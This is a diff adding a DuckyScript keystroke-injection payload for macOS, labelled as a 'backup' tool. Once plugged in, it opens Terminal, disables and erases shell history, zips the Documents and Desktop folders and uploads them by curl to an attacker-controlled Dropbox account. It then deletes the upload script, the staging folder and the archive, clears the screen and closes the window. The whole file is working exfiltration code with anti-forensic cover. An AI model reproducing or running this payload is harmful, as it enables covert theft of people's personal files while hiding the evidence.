@@ -1,0 +1,73 @@
+REM This script will create a folder on the desktop named "backup"
+REM it will then copy the Documents and Desktop contents to the folder and create a .zip
+REM Once the zip is created it will proceed to send all the contents to your Dropbox 
+REM you MUST replace "<API access token here>" with your actual API accesss token 
+
+
+REM Title: Docs and Desktop to Dropbox API
+REM Author: Narsty
+REM Target: MacOS
+REM Version: 1.0
+REM Category: Execution
+
+ID 05ac:021e Apple:Keyboard
+DELAY 500
+GUI SPACE
+DELAY 500
+STRING Terminal
+DELAY 1000
+ENTER
+DELAY 500
+STRING echo -e "export HISTCONTROL=ignorespace\nunset HISTFILE" >> ~/.bashrc && source ~/.bashrc && exec bash
+DELAY 500
+ENTER
+DELAY 500
+STRING history -d $(history | tail -n 2 | head -n 1 | awk '{ print $1 }')
+DELAY 500
+ENTER
+DELAY 500
+ENTER
+DELAY 500
+STRING  mkdir -p ~/Desktop/Backup/Desktop
+ENTER
+DELAY 500
+STRING  mkdir -p ~/Desktop/Backup/Documents
+ENTER
+DELAY 500
+STRING  cp -R ~/Documents/* ~/Desktop/Backup/Documents/
+ENTER
+DELAY 500
+STRING  cp -R ~/Desktop/* ~/Desktop/Backup/Desktop/
+ENTER
+DELAY 500
+STRING  echo 'cd ~/Desktop/Backup && zip -r backup.zip . && curl -X POST https://content.dropboxapi.com/2/files/upload -H "Authorization: Bearer <API access token here>" -H "Dropbox-API-Arg: {\"path\": \"/Backup/backup.zip\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" -H "Content-Type: application/octet-stream" --data-binary @backup.zip' > upload.sh
+ENTER
+DELAY 2500
+ENTER
+STRING  chmod +x upload.sh
+ENTER
+DELAY 500
+STRING  nohup ./upload.sh >/dev/null 2>&1 &
+ENTER
+DELAY 500
+STRING  rm upload.sh
+DELAY 500
+ENTER
+DELAY 5000
+STRING  rm -r ~/Desktop/backup
+DELAY 500
+ENTER
+DELAY 5000 
+STRING  rm backup.zip
+DELAY 500
+ENTER
+DELAY 500
+STRING  clear
+DELAY 500
+ENTER
+DELAY 250
+GUI w
+DELAY 1000 
+ENTER
+DELAY 250 
+ENTER
